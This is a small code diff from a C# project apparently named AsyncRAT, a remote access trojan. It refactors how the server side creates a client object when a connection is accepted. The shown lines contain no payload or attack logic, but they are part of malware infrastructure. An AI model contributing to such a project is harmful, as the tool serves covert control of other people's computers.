@@ -43,8 +43,7 @@ namespace AsyncRAT_Sharp.Sockets
         {
             try
             {
-                Clients CL = new Clients();
-                CL.InitializeClient(listener.EndAccept(ar));
+                Clients CL = new Clients(listener.EndAccept(ar));
             }
             catch { }
 
